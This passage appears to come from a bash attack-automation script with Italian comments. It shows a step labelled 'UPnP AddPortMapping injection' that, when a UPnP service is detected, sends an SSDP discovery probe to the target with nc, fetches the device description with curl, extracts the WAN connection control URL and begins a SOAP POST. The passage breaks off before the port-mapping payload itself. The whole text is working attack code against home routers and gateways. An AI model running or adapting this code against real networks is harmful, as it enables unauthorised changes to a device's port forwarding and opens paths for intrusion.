    # ── UPnP AddPortMapping injection ─────────────────────────────
    if _svc_found 1900 "upnp\|UPnP\|SSDP\|ssdp"; then
        log "  ▶ UPnP AddPortMapping injection"
        ran_attack=1
        if [[ $DRY_RUN -eq 0 ]]; then
            mkdir -p "$OUTDIR_BASE/upnp"
            # Scopri control URL dalla risposta SSDP
            local _upnp_loc
            _upnp_loc=$(timeout 5 bash -c \
                "printf 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:2\r\nST:upnp:rootdevice\r\n\r\n' \
                 | nc -u -w3 ${target} 1900 2>/dev/null" \
                | grep -i "^LOCATION:" | head -1 | grep -oP 'http://[^\r\n]+' || true)
            if [[ -n "$_upnp_loc" ]]; then
                local _upnp_xml; _upnp_xml=$(curl -s --max-time 5 "$_upnp_loc" 2>/dev/null || true)
                local _ctrl_url
                _ctrl_url=$(echo "$_upnp_xml" \
                    | grep -oP '(?<=<controlURL>)[^<]+' \
                    | grep -iE "WANIPConn|WANPPPConn" | head -1 || true)
                if [[ -n "$_ctrl_url" ]]; then
                    local _base; _base=$(echo "$_upnp_loc" | grep -oP 'http://[^/]+')
                    local _soap_resp
                    _soap_resp=$(curl -s --max-time 6 -X POST "${_base}${_ctrl_url}" \
